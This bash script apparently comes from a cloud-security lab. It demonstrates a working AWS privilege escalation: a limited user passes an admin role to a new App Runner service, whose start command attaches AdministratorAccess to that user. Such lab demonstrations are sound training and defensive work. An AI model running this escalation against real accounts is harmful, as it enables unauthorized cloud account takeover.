#!/bin/bash

# Demo script for iam:PassRole + apprunner:CreateService privilege escalation
# This script demonstrates how a user with apprunner:CreateService and iam:PassRole can escalate to admin

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-arcs-to-admin-starting-user"
TARGET_ROLE="pl-prod-arcs-to-admin-target-role"
APP_RUNNER_SERVICE_NAME="pl-privesc-apprunner-demo"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + App Runner CreateService Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_passrole_apprunner_createservice.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Create App Runner service configuration
echo -e "${YELLOW}Step 5: Preparing App Runner service configuration${NC}"
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
echo "Target Role ARN: $TARGET_ROLE_ARN"
echo "This role will be passed to the App Runner service (iam:PassRole)"
echo ""

# Create the service configuration JSON
SERVICE_CONFIG=$(cat <<'EOF'
{
  "ServiceName": "APP_RUNNER_SERVICE_NAME_PLACEHOLDER",
  "SourceConfiguration": {
    "ImageRepository": {
      "ImageIdentifier": "public.ecr.aws/aws-cli/aws-cli:latest",
      "ImageRepositoryType": "ECR_PUBLIC",
      "ImageConfiguration": {
        "Port": "8080",
        "StartCommand": "iam attach-user-policy --user-name STARTING_USER_PLACEHOLDER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
      }
    },
    "AutoDeploymentsEnabled": false
  },
  "InstanceConfiguration": {
    "Cpu": "1 vCPU",
    "Memory": "2 GB",
    "InstanceRoleArn": "TARGET_ROLE_ARN_PLACEHOLDER"
  }
}
EOF
)

# Replace placeholders with actual values
SERVICE_CONFIG="${SERVICE_CONFIG//APP_RUNNER_SERVICE_NAME_PLACEHOLDER/$APP_RUNNER_SERVICE_NAME}"
SERVICE_CONFIG="${SERVICE_CONFIG//STARTING_USER_PLACEHOLDER/$STARTING_USER}"
SERVICE_CONFIG="${SERVICE_CONFIG//TARGET_ROLE_ARN_PLACEHOLDER/$TARGET_ROLE_ARN}"

echo -e "${GREEN}✓ Service configuration prepared${NC}\n"

# Step 6: Create App Runner service with privileged role
echo -e "${YELLOW}Step 6: Creating App Runner service with admin role${NC}"
echo "This is the privilege escalation vector - the service will:"
echo "  1. Run with the target role's permissions (Administrator)"
echo "  2. Execute a StartCommand that grants us admin access"
echo "  3. Attach AdministratorAccess policy to our user"
echo ""

# Save the JSON to a temporary file
echo "$SERVICE_CONFIG" > /tmp/apprunner-config.json

# Create the service
echo "Creating App Runner service: $APP_RUNNER_SERVICE_NAME"
SERVICE_RESULT=$(aws apprunner create-service \
    --region $AWS_REGION \
    --cli-input-json file:///tmp/apprunner-config.json \
    --output json 2>&1)
CREATE_EXIT_CODE=$?

if [ $CREATE_EXIT_CODE -eq 0 ]; then
    SERVICE_ARN=$(echo "$SERVICE_RESULT" | jq -r '.Service.ServiceArn')
    echo "Service ARN: $SERVICE_ARN"
    echo -e "${GREEN}✓ Successfully created App Runner service${NC}"
else
    echo -e "${RED}Error: Failed to create App Runner service (exit code: $CREATE_EXIT_CODE)${NC}"
    echo "$SERVICE_RESULT"
    rm -f /tmp/apprunner-config.json
    exit 1
fi
echo ""

# Clean up temp file
rm -f /tmp/apprunner-config.json

# Step 7: Wait for App Runner service to start
echo -e "${YELLOW}Step 7: Waiting for App Runner service to start and execute${NC}"
echo "This may take 3-5 minutes as App Runner:"
echo "  - Downloads the container image"
echo "  - Starts the service"
echo "  - Executes the StartCommand (which grants us admin)"
echo ""

MAX_WAIT=400  # 6-7 minutes
WAIT_TIME=0
SERVICE_RUNNING=false

while [ $WAIT_TIME -lt $MAX_WAIT ]; do
    # Check service status
    SERVICE_STATUS=$(aws apprunner describe-service \
        --region $AWS_REGION \
        --service-arn "$SERVICE_ARN" \
        --query 'Service.Status' \
        --output text 2>/dev/null || echo "UNKNOWN")

    echo "Service status: $SERVICE_STATUS (waited ${WAIT_TIME}s)"

    if [ "$SERVICE_STATUS" = "RUNNING" ]; then
        echo -e "${GREEN}✓ App Runner service is running${NC}\n"
        SERVICE_RUNNING=true
        break
    elif [ "$SERVICE_STATUS" = "CREATE_FAILED" ] || [ "$SERVICE_STATUS" = "OPERATION_IN_PROGRESS" ]; then
        echo "Status: $SERVICE_STATUS - continuing to wait..."
    fi

    sleep 15
    WAIT_TIME=$((WAIT_TIME + 15))
done

if [ "$SERVICE_RUNNING" = false ]; then
    echo -e "${YELLOW}Warning: Service may not be fully running yet (status: $SERVICE_STATUS)${NC}"
    echo "Proceeding to check if the privilege escalation completed..."
    echo ""
fi

# Step 8: Wait for IAM policy propagation
echo -e "${YELLOW}Step 8: Waiting for IAM policy changes to propagate${NC}"
echo "The App Runner service should have attached AdministratorAccess to our user..."
echo "Waiting 15 seconds for IAM policy propagation..."
sleep 15
echo -e "${GREEN}✓ Policy propagation wait complete${NC}\n"

# Step 9: Verify admin access
echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    echo "The service may still be starting up. Service ARN: $SERVICE_ARN"
    echo "You can check the service status with:"
    echo "  aws apprunner describe-service --service-arn $SERVICE_ARN --region $AWS_REGION"
    exit 1
fi
echo ""

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Created App Runner service with privileged role: $TARGET_ROLE"
echo "3. Service StartCommand executed with admin permissions"
echo "4. StartCommand attached AdministratorAccess policy to $STARTING_USER"
echo "5. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (PassRole + CreateService)"
echo -e "  → App Runner Service with $TARGET_ROLE (Admin)"
echo -e "  → StartCommand executes with admin permissions"
echo -e "  → Grants admin to $STARTING_USER → Admin Access"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- App Runner Service: $APP_RUNNER_SERVICE_NAME"
echo "- Service ARN: $SERVICE_ARN"
echo "- Modified Policy: AdministratorAccess attached to $STARTING_USER"

echo -e "\n${RED}⚠ Warning: The App Runner service is still running${NC}"
echo -e "${RED}⚠ App Runner services incur charges while active${NC}"
echo -e "${RED}⚠ The AdministratorAccess policy is still attached to $STARTING_USER${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""
